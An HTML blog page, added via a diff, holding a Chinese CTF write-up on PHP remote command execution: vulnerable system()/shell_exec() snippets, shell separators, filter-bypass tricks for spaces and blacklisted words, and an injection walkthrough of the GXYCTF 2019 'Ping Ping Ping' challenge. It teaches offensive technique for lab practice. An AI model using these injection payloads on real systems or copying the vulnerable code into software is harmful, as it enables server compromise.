@@ -1,0 +1,830 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/gc.jpg">
+  <link rel="icon" href="/img/gc.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="fru1ts">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="RCE基础RCE(remote command&#x2F;code execute)漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上在CTF中，命令执行一般发生在远程，故被称为远程命令执行 通常情况下，在开发者使用一些执行命">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCE">
+<meta property="og:url" content="https://fru1ts.github.io/2023/01/05/RCE/index.html">
+<meta property="og:site_name" content="fru1ts的故酒">
+<meta property="og:description" content="RCE基础RCE(remote command&#x2F;code execute)漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上在CTF中，命令执行一般发生在远程，故被称为远程命令执行 通常情况下，在开发者使用一些执行命">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fru1ts.github.io/2023/01/05/RCE/1.png">
+<meta property="article:published_time" content="2023-01-05T03:34:48.000Z">
+<meta property="article:modified_time" content="2023-01-05T09:28:48.533Z">
+<meta property="article:author" content="fru1ts">
+<meta property="article:tag" content="PHP代码审计,rce">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://fru1ts.github.io/2023/01/05/RCE/1.png">
+  
+  
+  
+  <title>RCE - fru1ts的故酒</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"fru1ts.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"WEdmoCOkNdSUMsONpu72ngCo-gzGzoHsz","app_key":"PSBkctB8cKrR97yZLNXnJ0nj","server_url":"https://wedmocok.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>fru1ts的故酒</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="RCE"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-01-05 11:34" pubdate>
+          2023年1月5日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          26 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">RCE</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年1月5日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="RCE基础"><a href="#RCE基础" class="headerlink" title="RCE基础"></a>RCE基础</h3><p>RCE(remote command&#x2F;code execute)漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p>
+<p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口<br>比如我们常见的<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%B7%AF%E7%94%B1%E5%99%A8&spm=1001.2101.3001.7020">路由器</a>、防火墙、入侵检测等设备的web管理界面上<br>在CTF中，命令执行一般发生在远程，故被称为远程命令执行</p>
+<p>通常情况下，在开发者使用一些执行命令函数且未对用户输入的数据进行安全检查时，可以注入恶意的命令，使整台服务器处于危险</p>
+<p>中。命令注入就是通过注入一些特殊字符，改变原本的执行意图，从而执行攻击者指定的命令。</p>
+<p>PHP 中有不少可以直接执行代码的函数。</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">eval</span>();<br><span class="hljs-built_in">assert</span>();<br><span class="hljs-built_in">system</span>();<br><span class="hljs-built_in">exec</span>();<br><span class="hljs-built_in">shell_exec</span>();<br><span class="hljs-built_in">passthru</span>();<br><span class="hljs-built_in">escapeshellcmd</span>();<br><span class="hljs-built_in">pcntl_exec</span>();<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-variable">$str</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;echo &quot;</span>.<span class="hljs-variable">$str</span>);<br><span class="hljs-comment">#?content=123 &amp;&amp; whoami</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><span class="hljs-variable">$cmd</span>=<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ping&#x27;</span>.<span class="hljs-variable">$target</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="hljs-variable">$cmd</span>.<span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="windows系统的cmd-exe和Linux系统的bash程序在解析命令时异同点"><a href="#windows系统的cmd-exe和Linux系统的bash程序在解析命令时异同点" class="headerlink" title="windows系统的cmd.exe和Linux系统的bash程序在解析命令时异同点"></a>windows系统的cmd.exe和Linux系统的bash程序在解析命令时异同点</h3><h4 id="1-转义字符"><a href="#1-转义字符" class="headerlink" title="1.转义字符"></a>1.转义字符</h4><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Windows的转义字符为“^”<br>Linux的转义字符为“<span class="hljs-string">\”</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="2．多条命令执行"><a href="#2．多条命令执行" class="headerlink" title="2．多条命令执行"></a>2．多条命令执行</h4><p>在命令注入中通常需要注入多条命令来扩大危害</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Windows下<br><span class="hljs-meta">&amp;&amp;：前面语句为真时，才执行后面的命令</span><br><span class="hljs-meta">&amp;：前面语句为假时直接执行后面的命令</span><br><span class="hljs-string">||：前面为假执行后面的命令</span><br><span class="hljs-string">|：直接执行后面的命令</span><br>url中%<span class="hljs-number">0</span>a实现换行也可以多语句执行<br><br>Linux下：<br>;:前面的执行完执行后面的<br><span class="hljs-meta">&amp;&amp;：前面为真才执行后面</span><br><span class="hljs-string">||：前面为假才执行后面</span><br><span class="hljs-string">|：直接执行后面</span><br>$(),``,%<span class="hljs-number">0</span>a,%<span class="hljs-number">0</span>d<br></code></pre></td></tr></table></figure>
+
+<h4 id="3．注释符号"><a href="#3．注释符号" class="headerlink" title="3．注释符号"></a>3．注释符号</h4><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">windows的注释符号为“::</span>”<br>Linux的注释符号为“＃”<br></code></pre></td></tr></table></figure>
+
+<h3 id="命令执行的绕过和技巧"><a href="#命令执行的绕过和技巧" class="headerlink" title="命令执行的绕过和技巧"></a>命令执行的绕过和技巧</h3><h4 id="1-过滤空格"><a href="#1-过滤空格" class="headerlink" title="1.过滤空格"></a>1.过滤空格</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$cmd</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;CMD:&quot;</span>.<span class="hljs-variable">$cmd</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&gt;?<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell">(<span class="hljs-number">1</span>)fuzz一下%<span class="hljs-number">00</span>～%ff之间的字符串，有一下字符可以绕过空格的限制<br>(<span class="hljs-number">2</span>)通过字符串截取的方式获取空格<br>	windows下：~<br>        如：%ProgramFiles:~<span class="hljs-number">10</span>,<span class="hljs-number">1</span>%<br>        <span class="hljs-comment">#%ProgramFiles%是环境变量：C:\Program Files，~10,1表示在第十个开始取一个刚好是空格</span><br>	linux下：<br>        <span class="hljs-built_in">cat</span><span class="hljs-variable">$</span>&#123;IFS&#125;flag.txt<br>        <span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9flag</span>.txt<br>        <span class="hljs-built_in">cat</span>&lt;flag.txt<br>        <span class="hljs-built_in">cat</span>&lt;&gt;flag.txt<br>        &#123;<span class="hljs-built_in">cat</span>,flag.txt &#125;<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="2-黑名单关键字"><a href="#2-黑名单关键字" class="headerlink" title="2.黑名单关键字"></a>2.黑名单关键字</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php">(<span class="hljs-number">1</span>)利用变量拼接<br>	linux下：a=c;b=at;c=he;d=llo;$a<span class="hljs-variable">$b</span> $&#123;c&#125;$&#123;d&#125;   <span class="hljs-comment">#cat hello</span><br>(<span class="hljs-number">2</span>)使用通配符<br>	“？”代表任意一个字符串，“*”则代表任意个字符串<br>	windows下：type fla*<br>	linux下:cat fl*<br>(<span class="hljs-number">3</span>)单引号或双引号绕过：linux下：ca<span class="hljs-string">&#x27;&#x27;</span>t flag 或 ca<span class="hljs-string">&quot;&quot;</span>t <span class="hljs-title function_ invoke__">flag</span><br>(<span class="hljs-number">4</span>)反斜杆绕过：linux下：ca\t f\<span class="hljs-title function_ invoke__">lag</span><br>(<span class="hljs-number">5</span>)借用已有字符串<br>	利用<span class="hljs-title function_ invoke__">substr</span>()函数截取<br>	linux下：<br>        <span class="hljs-comment">#lemon.php</span><br>        <span class="hljs-meta">&lt;?php</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>        <span class="hljs-meta">?&gt;</span><br>        substr $(awk NR==<span class="hljs-number">1</span> lemon.php) <span class="hljs-number">1</span> <span class="hljs-number">1</span>   <span class="hljs-comment">#&lt;</span><br>        substr $(awk NR==<span class="hljs-number">1</span> lemon.php) <span class="hljs-number">2</span> <span class="hljs-number">1</span>   <span class="hljs-comment">#?</span><br>(<span class="hljs-number">6</span>)编码绕过：base64编码，hex编码（linux）<br></code></pre></td></tr></table></figure>
+
+<h3 id="GXYCTF-2019-Ping-Ping-Ping"><a href="#GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF 2019]Ping Ping Ping"></a>[GXYCTF 2019]Ping Ping Ping</h3><img src="/2023/01/05/RCE/1.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>一个ping的接口，也就是结合ping进行rce</p>
+<p>尝试<code>127.0.0.1|ls</code></p>
+<p>得到</p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta">flag.php<br><span class="hljs-keyword">index</span>.php<br></code></pre></td></tr></table></figure>
+
+<p>测试知道过滤了空格，flag等</p>
+<p>尝试cat index.php，即构造<code>127.0.0.1|cat$IFS$9index.php</code></p>
+<p>得到index.php的源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]))&#123;<br>		<span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>))&#123;<br>			<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$match</span>);<br>			<span class="hljs-keyword">print</span>(<span class="hljs-variable">$ip</span>);<br>			<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>);<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);<br>		&#125;<br>		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your space!&quot;</span>);<br>		&#125;<br>		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/bash/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your bash!&quot;</span>);<br>		&#125;<br>		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);<br>		&#125;<br>		<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;ping -c 4 &quot;</span>.<span class="hljs-variable">$ip</span>);<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<br>		<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$a</span>);<br>	&#125;<br><br>	<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>审计一下代码发现各种特殊字符都被过滤flag四个字母还不能顺序出现，那就考虑变量拼接</p>
+<p><code>127.0.0.1;a=ag.php;b=fl;cat$IFS$9$b$a</code>,值得注意的是都要用<code>;</code>分开，不能又用|又用;</p>
+<p>再查看页面源码就可以得到flag<code>NSSCTF&#123;5775c26b-4632-4342-9e6b-347d2d00fa55&#125;</code></p>
+<blockquote>
+<p>参考资料</p>
+<p>《从0到1：CTFer成长之路 (Nu1L战队 编著) 》</p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/web/php/php/#_8">https://ctf-wiki.org/web/php/php/#_8</a></p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-rce/">#PHP代码审计,rce</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>RCE</div>
+      <div>https://fru1ts.github.io/2023/01/05/RCE/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>fru1ts</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年1月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/01/04/ssrf/" title="ssrf">
+                        <span class="hidden-mobile">ssrf</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"WEdmoCOkNdSUMsONpu72ngCo-gzGzoHsz","appKey":"PSBkctB8cKrR97yZLNXnJ0nj","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://fru1ts.github.io" target="_self" rel="nofollow noopener"><span>fru1ts</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
